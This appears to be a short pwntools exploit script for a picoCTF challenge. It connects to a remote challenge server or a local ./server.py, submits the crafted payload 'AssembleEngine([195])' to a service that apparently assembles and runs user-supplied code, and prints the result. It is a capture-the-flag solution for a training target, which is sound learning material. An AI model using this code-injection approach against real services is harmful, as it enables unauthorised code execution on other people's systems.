#!/usr/bin/python3

from pwn import *
import sys

if len(sys.argv) > 1:
    r = remote('mercury.picoctf.net', 63943)
else:
    r = process('./server.py')

payload = 'AssembleEngine([195])'
r.sendlineafter('Provide size. Must be < 5k:', str(len(payload)))
r.sendline(payload)
r.recvuntil('Run Complete\n')
out = r.recvall().decode()
print(out)
r.interactive()
